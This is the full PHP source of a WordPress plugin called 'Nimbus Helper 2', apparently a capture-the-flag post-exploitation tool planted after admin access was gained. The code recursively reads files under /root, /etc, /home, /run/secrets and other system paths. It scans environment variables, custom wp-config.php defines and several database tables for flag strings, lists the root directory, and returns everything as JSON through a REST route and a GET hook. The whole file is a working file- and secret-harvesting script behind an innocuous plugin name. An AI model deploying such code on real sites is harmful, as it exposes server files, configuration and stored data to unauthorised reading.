<?php
/*
Plugin Name: Nimbus Helper 2
Description: Broader read-only flag scan (filesystem, environment, wp-config, database).
Version: 1.0
*/
if (!defined('ABSPATH')) { exit; }

function nh2_grep($path, &$hits, $depth = 0) {
    if ($depth > 7 || count($hits) >= 40) { return; }
    $skip = array('/proc','/sys','/dev','/usr','/lib','/lib64','/bin','/sbin','/boot','/run');
    foreach ($skip as $s) { if ($path === $s || strpos($path, $s . '/') === 0) { return; } }
    $items = @scandir($path);
    if ($items === false) { return; }
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') { continue; }
        $p = rtrim($path, '/') . '/' . $it;
        if (@is_dir($p)) { nh2_grep($p, $hits, $depth + 1); }
        elseif (@is_file($p)) {
            $sz = @filesize($p);
            if ($sz === false || $sz > 2 * 1024 * 1024) { continue; }
            $c = @file_get_contents($p);
            if ($c === false) { continue; }
            if (preg_match('/IONIC\{[^}]{0,200}\}/', $c, $m)
                || preg_match('/flag\{[^}]{0,200}\}/i', $c, $m)
                || preg_match('/(?:CTF|PENS)\{[^}]{0,200}\}/i', $c, $m)) {
                $hits[] = array(
                    'path'    => $p,
                    'match'   => $m[0],
                    'context' => substr($c, max(0, strpos($c, $m[0]) - 80), 300),
                );
            }
        }
    }
}

function nh2_run() {
    $out = array();
    $out['abspath'] = ABSPATH;

    $roots = array('/flag.txt','/flag','/root','/home','/opt','/srv','/var/www','/tmp','/etc','/run/secrets','/var/lib');
    $hits = array();
    foreach ($roots as $r) {
        if (@is_file($r)) {
            $c = @file_get_contents($r);
            if ($c !== false && preg_match('/(IONIC|flag|CTF)\{[^}]{0,200}\}/i', $c, $m)) {
                $hits[] = array('path' => $r, 'match' => $m[0]);
            }
        } elseif (@is_dir($r)) { nh2_grep($r, $hits, 0); }
        if (count($hits) >= 40) { break; }
    }
    $out['fs_hits'] = $hits;

    $env = array();
    foreach (array_merge($_SERVER, $_ENV) as $k => $v) {
        if (is_string($v) && preg_match('/IONIC\{|flag\{|CTF\{/i', $v)) { $env[$k] = $v; }
    }
    foreach (getenv() as $k => $v) {
        if (is_string($v) && preg_match('/IONIC\{|flag\{|CTF\{/i', $v)) { $env['ENV_' . $k] = $v; }
    }
    $out['env_hits'] = $env;

    if (@is_file(ABSPATH . 'wp-config.php')) {
        $cfg = @file_get_contents(ABSPATH . 'wp-config.php');
        $out['wpconfig_custom'] = array();
        if ($cfg !== false && preg_match_all("/define\(\s*'([^']+)'\s*,\s*'([^']*)'\s*\)/", $cfg, $mm, PREG_SET_ORDER)) {
            foreach ($mm as $d) {
                if (!in_array($d[1], array('DB_NAME','DB_USER','DB_PASSWORD','DB_HOST','AUTH_KEY',
                    'SECURE_AUTH_KEY','LOGGED_IN_KEY','NONCE_KEY','AUTH_SALT','SECURE_AUTH_SALT',
                    'LOGGED_IN_SALT','NONCE_SALT'))) {
                    $out['wpconfig_custom'][$d[1]] = $d[2];
                }
            }
        }
    }

    global $wpdb;
    $q = array();
    foreach (array(
        'options'  => array('option_name','option_value'),
        'postmeta' => array('meta_key','meta_value'),
        'usermeta' => array('meta_key','meta_value'),
        'posts'    => array('post_title','post_content'),
    ) as $t => $cols) {
        $sql = "SELECT {$cols[0]} AS k, {$cols[1]} AS v FROM {$wpdb->prefix}{$t}
                WHERE {$cols[1]} LIKE '%IONIC{%' OR {$cols[1]} LIKE '%flag{%' LIMIT 20";
        $rows = $wpdb->get_results($sql, ARRAY_A);
        if ($rows) { $q[$t] = $rows; }
    }
    $out['db_hits'] = $q;
    $out['readable_root'] = @scandir('/');
    return $out;
}

add_action('rest_api_init', function () {
    register_rest_route('nh2/v1', '/run', array(
        'methods' => 'GET',
        'permission_callback' => function () { return current_user_can('manage_options'); },
        'callback' => function () { return nh2_run(); },
    ));
});

add_action('init', function () {
    if (isset($_GET['nh2']) && $_GET['nh2'] === '1' && current_user_can('manage_options')) {
        header('Content-Type: application/json');
        echo json_encode(nh2_run(), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }
});
